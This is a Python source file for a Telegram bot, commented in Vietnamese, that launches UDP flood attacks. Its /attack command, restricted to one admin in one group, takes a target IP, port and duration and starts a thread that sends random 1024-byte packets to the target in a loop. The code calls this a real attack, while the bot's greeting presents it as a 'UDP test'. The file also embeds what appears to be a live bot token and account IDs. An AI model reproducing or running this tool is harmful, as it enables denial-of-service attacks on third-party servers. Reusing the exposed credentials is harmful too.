
import telebot
import threading
import time
import os
import socket
import random

# === Cấu hình ===
TOKEN = "8064257148:AAH6DfA-DrE_pS60OBfOj1JsDYOKKdLtmdc"
ADMIN_ID = 6821953959
GROUP_ID = -1002149794790  # Group được phép sử dụng bot

bot = telebot.TeleBot(TOKEN)

def is_from_group(message):
    return message.chat.type in ['group', 'supergroup'] and message.chat.id == GROUP_ID

# === Hàm tấn công UDP thật ===
def udp_attack(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)

    while time.time() < timeout:
        try:
            sock.sendto(bytes_data, (ip, port))
        except:
            pass

# === /start: Chào mừng ===
@bot.message_handler(commands=['start'])
def start(message):
    if not is_from_group(message):
        return
    bot.reply_to(message, "Chào bạn! Gửi /attack để thực hiện test UDP.")

# === /myid: Lấy Telegram user ID ===
@bot.message_handler(commands=['myid'])
def myid(message):
    if not is_from_group(message):
        return
    bot.reply_to(message, f"ID của bạn là: `{message.from_user.id}`", parse_mode='Markdown')

# === /attack: chỉ cho ADMIN_ID và trong group ===
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if not is_from_group(message):
        return
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Bạn không có quyền sử dụng lệnh này.")
        return
    bot.reply_to(message, "Nhập theo cú pháp: `ip port thời_gian`\nVí dụ: `1.2.3.4 27015 10`", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack)

# === Xử lý lệnh attack ===
def process_attack(message):
    if not is_from_group(message):
        return
    try:
        ip, port, duration = message.text.split()
        port = int(port)
        duration = int(duration)
        bot.reply_to(message, f"Đang gửi UDP tới {ip}:{port} trong {duration} giây.")
        thread = threading.Thread(target=udp_attack, args=(ip, port, duration))
        thread.start()
    except:
        bot.reply_to(message, "Sai cú pháp. Nhập lại bằng: `ip port thời_gian`")

# === Khởi động bot ===
if __name__ == '__main__':
    print("Bot đang chạy...")
    bot.infinity_polling()
